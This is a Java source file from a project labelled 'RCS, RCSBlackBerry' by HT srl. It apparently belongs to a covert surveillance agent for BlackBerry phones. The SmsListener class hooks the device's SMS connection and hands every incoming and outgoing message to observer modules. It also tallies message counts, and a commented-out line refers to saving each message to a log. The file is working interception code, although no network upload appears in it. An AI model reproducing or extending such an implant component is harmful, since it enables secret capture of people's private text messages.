//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/
	
package blackberry.agent.sms;

import java.io.IOException;
import java.util.Vector;

import javax.microedition.io.Connector;
import javax.wireless.messaging.MessageConnection;

import net.rim.device.api.system.RuntimeStore;
import blackberry.Listener;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.SmsObserver;
import blackberry.utils.Check;

public class SmsListener {

    private static final long GUID = 0xe78b740082783262L;

    //#ifdef DEBUG
    static Debug debug = new Debug("SmsListener", DebugLevel.VERBOSE);
    //#endif

    Vector smsObservers = new Vector();

    private MessageConnection smsconn;
    private Thread inThread;
    private SMSInOutListener inoutsms;

    //private MessageAgent messageAgent;
    static SmsListener instance;

    private SmsListener() {
    }

    /*
     * public void setMessageAgent(final MessageAgent messageAgent) {
     * this.messageAgent = messageAgent; }
     */

    public synchronized static SmsListener getInstance() {

        if (instance == null) {
            instance = (SmsListener) RuntimeStore.getRuntimeStore().get(GUID);
            if (instance == null) {
                final SmsListener singleton = new SmsListener();
                RuntimeStore.getRuntimeStore().put(GUID, singleton);
                instance = singleton;
            }
        }

        return instance;
    }

    public synchronized void addSmsObserver(final SmsObserver observer) {
        //#ifdef DEBUG
        debug.trace("addSmsObserver");
        //#endif
        Listener.addObserver(smsObservers, observer);
        //#ifdef DEBUG
        debug.trace("addSmsObserver, total observers: " + smsObservers.size());
        //#endif

        if (!isRunning()) {
            //#ifdef DEBUG
            debug.trace("addSmsObserver, not running, so start");
            //#endif
            start();
        }
    }

    public synchronized void removeSmsObserver(final SmsObserver observer) {
        //#ifdef DEBUG
        debug.trace("removeSmsObserver");
        //#endif
        Listener.removeObserver(smsObservers, observer);
        //#ifdef DEBUG
        debug.trace("addSmsObserver, total observers: " + smsObservers.size());
        //#endif

        if (smsObservers.size() == 0) {
            //#ifdef DEBUG
            debug.trace("removeSmsObserver, no observer, so stop");
            //#endif
            stop();
        }
    }

    public synchronized boolean isRunning() {
        final boolean ret = smsconn != null;

        //#ifdef DBC
        Check.asserts((smsconn != null) == ret,
                "isRunning, bad status smsconn: " + ret);
        Check.asserts((inoutsms != null) == ret,
                "isRunning, bad status inoutsms: " + ret);
        Check.asserts((inThread != null) == ret,
                "isRunning, bad status inThread: " + ret);
        //#endif

        return ret;
    }

    public int getTotOut() {
        return SMSInOutListener.totOut;
    }

    public int getTotIn() {
        return SMSInOutListener.totIn;
    }

    private synchronized final void start() {
        if (isRunning()) {
            //#ifdef DEBUG
            debug.error("already running");
            //#endif
            return;
        }
        try {
            smsconn = (MessageConnection) Connector.open("sms://:0");

            //#ifdef DEBUG
            debug.trace("start: SMSListener");
            //#endif

            inoutsms = new SMSInOutListener(smsconn, this);

        } catch (final IOException e) {
            //#ifdef DEBUG
            debug.error(e);
            //#endif
        }

        inThread = new Thread(inoutsms);
        inThread.start();

        try {
            smsconn.setMessageListener(inoutsms);
        } catch (final IOException e) {
            //#ifdef DEBUG
            debug.error(e);
            //#endif
        }
    }

    private synchronized final void stop() {
        if (!isRunning()) {
            //#ifdef DEBUG
            debug.error("already not running");
            //#endif
            return;
        }

        //#ifdef DEBUG
        debug.info("Stopping SMSListener");
        //#endif
        try {
            if (smsconn != null) {
                //#ifdef DEBUG
                debug.trace("stop: smsconn");
                //#endif

                smsconn.setMessageListener(null);
                smsconn.close();
               
            }
            if (inoutsms != null) {
                //#ifdef DEBUG
                debug.trace("stop: inoutsms");
                //#endif
                inoutsms.stop();
            }

            if (inThread != null) {
                //#ifdef DEBUG
                debug.trace("stop: joining inThread");
                //#endif

                inThread.join();

                //#ifdef DEBUG
                debug.trace("stop: joined inThread");
                //#endif
            }

        } catch (final Exception e) {
            //#ifdef DEBUG
            debug.error(e);
            //#endif
        } finally {
            smsconn = null;
            inoutsms = null;
            inThread = null;
        }

        //#ifdef DBC
        Check.ensures(!isRunning(), "Shouldn't be running, now");
        //#endif
    }

    public void run() {

    }

    synchronized boolean dispatch(
            final javax.wireless.messaging.Message message,
            final boolean incoming) {

        final int size = smsObservers.size();
        for (int i = 0; i < size; i++) {

            final SmsObserver observer = (SmsObserver) smsObservers
                    .elementAt(i);
            //#ifdef DEBUG
            debug.trace("notify: " + observer);
            //#endif

            observer.onNewSms(message, incoming);
        }

        return true;
        //return saveLog(message, incoming);
    }

}
